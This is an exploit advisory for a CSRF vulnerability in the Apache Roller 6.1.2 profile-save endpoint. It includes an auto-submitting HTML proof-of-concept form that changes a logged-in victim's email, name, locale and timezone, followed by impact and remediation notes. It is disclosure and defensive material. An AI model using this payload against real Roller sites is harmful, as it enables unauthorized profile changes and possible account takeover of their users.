# Apache Roller v6.1.2 - Cross-Site Request Forgery (CSRF) in Profile Update

## Vulnerability Details

- **Version**: v6.1.2
- **Date**: 2025-11-09
- **Exploit Author**: Van Lam Nguyen
- **Facebook**: https://www.facebook.com/vanlam1412
- **Vendor Homepage**: https://roller.apache.org
- **Software Link**: https://github.com/apache/roller/archive/refs/tags/roller-6.1.2.zip
- **Tested on**: Windows
- **CVE**: N/A
- **Demo**: https://youtu.be/iPEiVzcpJJU

## Overview

Roller v6.1.2 and below was discovered to contain a Cross-Site Request Forgery (CSRF) vulnerability in the endpoint `/roller/roller-ui/profile!save.rol`. 

This vulnerability allows attackers to arbitrarily update the victim user's profile information (e.g., email, full name, locale, timezone) via a crafted HTML page.

## Proof of Concept

The vulnerability allows unauthorized requests to `/roller/roller-ui/profile!save.rol` that update the user's profile without CSRF protection.

### HTML Exploit Code

```html
<html>
<head>
    <form id="exploitForm" action="http://localhost:8080/roller/roller-ui/profile!save.rol" method="POST">
        <input name="bean.userName" value="vanlam" type="hidden">
        <input name="bean.screenName" value="hacked" type="hidden">
        <input name="bean.fullName" value="hacked" type="hidden">
        <input name="bean.emailAddress" value="hacked@gmail.com" type="hidden">
        <input name="bean.passwordText" value="" type="hidden">
        <input name="bean.passwordConfirm" value="" type="hidden">
        <input name="bean.locale" value="vi_VN" type="hidden">
        <input name="bean.timeZone" value="Asia/Bangkok" type="hidden">
    </form>

    <script>
        document.getElementById('exploitForm').submit();
    </script>
</head>
</html>
```

### Form Parameters

- `bean.userName`: vanlam
- `bean.screenName`: hacked
- `bean.fullName`: hacked
- `bean.emailAddress`: hacked@gmail.com
- `bean.passwordText`: (empty)
- `bean.passwordConfirm`: (empty)
- `bean.locale`: vi_VN
- `bean.timeZone`: Asia/Bangkok

## Impact

An attacker can craft a malicious HTML page that, when visited by an authenticated Roller user, will automatically submit a form to update the victim's profile information without their consent. This can lead to:

- Unauthorized changes to user profile data
- Potential account takeover if email address is changed
- Disruption of user experience through locale and timezone changes

## Remediation

- Implement CSRF tokens for all state-changing requests
- Validate the Origin and Referer headers
- Use same-site cookies
- Implement proper authentication and authorization checks